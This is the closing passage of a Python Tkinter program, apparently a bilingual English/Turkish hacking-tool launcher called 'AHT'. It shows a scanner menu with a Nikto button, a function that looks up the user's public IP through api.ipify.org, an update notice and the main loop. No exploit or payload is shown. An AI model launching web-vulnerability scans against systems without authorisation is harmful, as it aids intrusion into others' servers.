        self.bt(self.T("CONNECT","BAGLAN"),baglan,7,2,bg="#005500")

    # ===================== SCANNER =====================
    def m_scan(self):
        self.ps=self.show_main; self.clr(); self.cg(4,3); self.bk(); self.tt(self.T("SCANNER","TARAYICI"))
        for t,c,r,c2 in [("Nikto",self.nikto,2,1)]: self.bt(t,c,r,c2)

    # ===================== GLOBAL =====================
    def myip(self):
        try:
            r=urllib.request.urlopen("https://api.ipify.org",timeout=5)
            messagebox.showinfo("My IP",f"IP: {r.read().decode()}")
        except: messagebox.showerror(self.T("Error","Hata"),self.T("Connection failed","Baglanti hatasi"))

    def upd(self):
        messagebox.showinfo(self.T("Update","Guncelleme"),self.T("github.com/anomalco/AHT","github.com/anomalco/AHT adresini kontrol edin"))

    def run(self): self.root.mainloop()

if __name__=="__main__":
    App().run()
